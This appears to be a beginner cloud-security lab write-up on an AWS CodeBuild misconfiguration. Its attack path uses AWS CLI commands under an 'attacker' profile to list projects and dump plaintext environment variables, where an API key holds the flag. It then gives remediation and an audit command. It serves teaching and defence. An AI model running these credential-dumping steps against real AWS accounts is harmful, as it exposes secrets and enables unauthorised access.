# CodeBuild — Plaintext Environment Variables

**Difficulty:** Beginner | **Provider:** AWS | **Category:** CI/CD / Secrets

## Scenario

A DevOps team configured an AWS CodeBuild project with database credentials and
an API key stored as **PLAINTEXT** environment variables. Unlike the `PARAMETER_STORE`
or `SECRETS_MANAGER` types, plaintext variables are stored directly in the project
definition and returned unmasked by `codebuild:BatchGetProjects`.

Any IAM identity with `codebuild:BatchGetProjects` can read the full project
configuration, including all plaintext environment variable values.

## Attack Path

```
[Attacker] cb-reader-<id> (codebuild:BatchGetProjects + codebuild:ListProjects)
    |
    v
aws codebuild list-projects  -->  find cumulonimbus-deploy-* project
    |
    v
aws codebuild batch-get-projects --names <name>
    |
    v
projects[0].environment.environmentVariables[?name=='DEPLOY_API_KEY'].value  -->  flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — List CodeBuild projects

```bash
aws codebuild list-projects \
  --profile attacker \
  --query "projects"
```

### Step 3 — Dump project environment variables

```bash
PROJECT_NAME="<project_name>"

aws codebuild batch-get-projects \
  --names "${PROJECT_NAME}" \
  --profile attacker \
  --query "projects[0].environment.environmentVariables"
```

The `DEPLOY_API_KEY` entry contains the flag.

## How to Fix in Production

1. **Use `PARAMETER_STORE` or `SECRETS_MANAGER` type** for sensitive variables —
   these store only the SSM/Secrets Manager ARN in the project definition and fetch
   the value at build time. `BatchGetProjects` returns the ARN, not the value.
2. **Restrict `codebuild:BatchGetProjects`** — it is often granted broadly as part of
   read-only CI/CD access policies. Only CI/CD administrators need it.
3. **Rotate any plaintext variables immediately** — treat them as compromised if the
   policy allowed broad access.
4. **Audit existing projects** for plaintext sensitive variables:
   ```bash
   aws codebuild list-projects --output text | tr '\t' '\n' | \
     xargs -I{} aws codebuild batch-get-projects --names {} | \
     jq '.projects[].environment.environmentVariables[] | select(.type=="PLAINTEXT")'
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
